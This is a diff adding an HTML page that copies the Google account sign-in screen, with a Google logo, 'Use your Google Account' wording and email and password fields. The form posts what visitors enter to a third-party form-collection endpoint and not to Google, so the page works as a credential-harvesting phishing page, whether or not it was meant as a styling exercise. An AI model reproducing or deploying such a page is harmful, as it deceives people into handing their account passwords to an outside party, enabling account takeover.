@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>giglieLogin</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Display:wght@200&display=swap" rel="stylesheet">
+<link href="http://fonts.cdnfonts.com/css/google-sans" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
+  <style>
+  *{padding: 0;
+  margin: 0; box-sizing: border-box;}
+    body{
+      width: 100vw;
+      height: 100vh;
+      display: grid;
+      place-items: center;
+      background: white;
+       font-family: 'Product Sans';
+    }
+    .main{
+      height: 500px;
+      border: 1px solid cyan;
+      display: flex;
+      flex-direction: column;
+      width: 28em;
+      padding:10px;
+      border-radius: 10px;
+
+    }
+    .googleicon{
+      height: 30px;
+      padding: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      overflow: hidden;
+      margin-top: 9px;
+
+    }
+     .googleicon>img{
+      width: 80px;
+      display: block;
+     }
+     .text{
+      display: block;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      position: relative;
+     }
+     .text>h3{
+      font-size: 23px;
+      font-weight: 400;
+      color: #202124;
+      line-height: 1.8;
+      font-family: 'Product Sans';
+     }
+     .text>h5{
+    color: #202124;
+    font-size: 17px;
+    font-weight: 500;
+    letter-spacing: 0.2px;
+    line-height: 1.7;
+     }
+     .form{
+      height: 170px;
+      margin-top: 7px;
+      padding: 20px;
+      display: grid;
+      grid-template-columns: 1fr ;
+      grid-template-rows: 60px 60px;
+      border: none;
+      position: relative;
+      gap: 15px 0px;
+     }
+     .form>input[type='email']{
+      padding-left: 10px;
+     }
+     .form>input[type='password']{
+       padding-left: 10px;
+     }
+     input{
+      border-radius:5px;
+      border: 1px solid cyan;
+      font-size: 17px;
+      position: relative;
+      outline: none;
+      z-index: 1;
+      width:100%;
+      height: 60px;
+      padding-left: 10px;
+      color: black;
+      background: white;
+     }
+     a{
+      color:#1a73e8;
+      text-decoration: none;
+     }
+     button{background: #1a73e8;}
+     .forg{
+      border:none;
+      padding-left: 20px;
+      margin-bottom: 2.30rem;
+     }
+    
+     .bottmflex{
+      line-height:5em;
+      padding-left: 24px;
+      display: flex;
+      padding-right: 10px;
+      justify-content: space-between;
+      align-items: center;
+     }
+     .btn{
+      height: 40px;
+      width: 79px;
+      border: none;
+      border-radius: 5px;
+      color: white;
+     }
+     .text2{
+      font-family: 'Roboto', sans-serif;
+      font-weight: 500;
+      color: #5f6368;
+      font-size: 14px;
+      margin-left: 20px !important;
+      border: none;
+      display: block;
+      margin-top: 30px;
+     }
+    
+   
+     .l2{
+      color: #999;
+      font-size: 18px;
+      font-weight:normal;
+      position:absolute;
+      pointer-events:none;
+      transition:0.2s ease all; 
+      left: 30px;
+      z-index: 2;
+      top: 115px;
+     }
+      label{
+      color: #999;
+      font-size: 18px;
+      font-weight:normal;
+      position:absolute;
+      pointer-events:none;
+      transition:0.2s ease all; 
+      left: 30px;
+      top: 38px;
+      z-index: 2;
+     }
+
+     input:focus~label,input:valid~label{
+      font-size: 14px;
+      color: blue;
+      top:11px;
+      background: white;
+     }
+      .input2:focus~.l2,.input2:valid~.l2{
+        font-size: 14px;
+      color: blue;
+      top:82px;
+      background: white;
+      }
+     
+     input:focus{
+      outline: 2px solid #1a73e8;
+     }
+     @media (max-width:500px){
+        .main{
+          border: none;
+          width: 100%;
+          height: 100vh;
+        }
+     }
+  </style>
+</head>
+<body>
+  <div class="main">
+    <div class="googleicon">
+      <img src="https://cdn.vox-cdn.com/thumbor/8tLchaDMIEDNzUD3mYQ7v1ZQL84=/0x0:2012x1341/920x613/filters:focal(0x0:2012x1341):format(webp)/cdn.vox-cdn.com/uploads/chorus_image/image/47070706/google2.0.0.jpg">
+      
+     
+    </div>
+    <div class="text">
+         <h3>Sign in</h3>
+    <h5>Use your Google Account</h5>
+      </div>
+      <form action="https://api.form-data.com/f/pr4vz9k0zbcrbmiuoa376m"
+      method="post">
+    <div class='form'>
+      <div class="g1">
+        <input class="inputeml" type="text" required="required" name="email">
+      <label>Email or phone</label>
+      </div>
+      <div class="g2">
+      <input type="password" required="required" class="input2" name="password">
+      <span class="l2">Enter your password</span>
+      </div>
+      
+    </div>
+     
+    <span class="forg"> <a href="###" id="forget"><b>Forgot email?</b></a></span>
+      
+      <span class="text2">
+        <p>Not your computer? Use Guest mode to sign in privately.</p> 
+        <a href="###"><b>Learn more</b>
+        </a>
+      </span> 
+      
+    
+     <div class="bottmflex">
+      <a href="###"><b>Creat account</b></a>
+      
+      <button class="btn" type="submit">Next</button>
+     
+     </div>
+     </form>
+    
+  </div>
+  <script>
+    
+  </script>
+</body>
+</html>
+
+
+
+
+
+
+<!-- // X-Small devices (portrait phones, less than 576px)
+// No media query for `xs` since this is the default in Bootstrap
+
+// Small devices (landscape phones, 576px and up)
+@media (min-width: 576px) { ... }
+
+// Medium devices (tablets, 768px and up)
+@media (min-width: 768px) { ... }
+
+// Large devices (desktops, 992px and up)
+@media (min-width: 992px) { ... }
+
+// X-Large devices (large desktops, 1200px and up)
+@media (min-width: 1200px) { ... }
+
+// XX-Large devices (larger desktops, 1400px and up)
+@media (min-width: 1400px) { ... } -->
